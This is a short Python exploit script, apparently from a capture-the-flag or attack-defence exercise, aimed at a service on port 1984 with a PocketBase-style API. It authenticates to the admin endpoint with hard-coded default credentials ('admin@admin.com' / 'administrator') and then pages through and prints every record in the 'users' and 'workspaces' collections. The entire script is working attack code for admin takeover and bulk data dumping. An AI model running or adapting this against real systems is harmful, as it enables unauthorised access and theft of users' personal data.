#!/usr/bin/env python3
import sys
import json
import requests

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
hint = json.dumps(
    sys.argv[2]
    if len(sys.argv) > 2
    else '{"username":"vulnerable","workspace_id":"i2yy40zjs6qgitq"}'
)

URL = f'http://{host}:1984'


def auth_as_admin(session: requests.Session):
    resp = session.post(
        f'{URL}/api/admins/auth-with-password',
        data={
            'identity': 'admin@admin.com',
            'password': 'administrator',
        },
    )
    session.headers["Authorization"] = resp.json()['token']


def dump_pb_table(session: requests.Session, table_name: str):
    max_per_page = 500
    resp = session.get(
        f'{URL}/api/collections/{table_name}/records',
        params={
            'perPage': max_per_page,
        },
    )
    table_data = resp.json()
    print(table_data, flush=True)

    page = 1
    dumped = max_per_page
    total = table_data['totalItems']
    while dumped < total:
        page += 1
        resp = session.get(
            f'{URL}/api/collections/{table_name}/records',
            params={
                'page': page,
                'perPage': max_per_page,
            },
        )
        print(resp.json(), flush=True)
        dumped += max_per_page


def main():
    s = requests.Session()
    auth_as_admin(s)
    dump_pb_table(s, 'users')
    dump_pb_table(s, 'workspaces')


if __name__ == '__main__':
    main()
